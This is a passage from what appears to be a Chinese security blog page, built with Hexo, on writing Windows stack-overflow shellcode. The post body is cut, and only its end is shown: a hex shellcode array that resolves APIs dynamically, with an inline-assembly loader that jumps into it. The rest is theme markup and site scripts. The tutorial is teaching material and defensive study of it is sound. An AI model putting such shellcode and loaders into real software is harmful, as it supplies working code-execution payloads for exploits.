+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
+
+void main()
+{
+    __asm
+    {
+        lea eax, shellcode2
+        push eax
+        ret
+    }
+}
+</code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+          
+            <a href="/tags/stack/" rel="tag"># stack</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/22/栈溢出原理与实践/" rel="next" title="栈溢出原理与实践">
+                <i class="fa fa-chevron-left"></i> 栈溢出原理与实践
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/06/23/HeapCreate/" rel="prev" title="HeapCreate()">
+                HeapCreate() <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/me.jpg"
+               alt="Introspelliam" />
+          <p class="site-author-name" itemprop="name">Introspelliam</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">128</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                    
+                      Weibo
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-shellcode概述"><span class="nav-number">1.</span> <span class="nav-text">1. shellcode概述</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-shellcode和exploit"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 shellcode和exploit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-shellcode需要解决的问题"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 shellcode需要解决的问题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-定位shellcode"><span class="nav-number">2.</span> <span class="nav-text">2. 定位shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-栈帧移位与jmp-esp"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 栈帧移位与jmp esp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-获取跳板地址"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 获取跳板地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-测试shellcode的可执行性"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 测试shellcode的可执行性</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-缓冲区的组织"><span class="nav-number">3.</span> <span class="nav-text">3. 缓冲区的组织</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-缓冲区的组成"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 缓冲区的组成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-抬高栈顶保护shellcode"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 抬高栈顶保护shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-使用其他跳转指令"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 使用其他跳转指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-不使用跳转指令"><span class="nav-number">3.4.</span> <span class="nav-text">3.4 不使用跳转指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-5-函数返回地址移位"><span class="nav-number">3.5.</span> <span class="nav-text">3.5 函数返回地址移位</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-开发通用的shellcode"><span class="nav-number">4.</span> <span class="nav-text">4. 开发通用的shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-定位API的原理"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 定位API的原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-shellcode的加载与测试"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 shellcode的加载与测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-3-动态定位API地址的shellcode"><span class="nav-number">4.3.</span> <span class="nav-text">4.3 动态定位API地址的shellcode</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Introspelliam</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+  
+
+
+  
+
+  
+
+</body>
+</html>
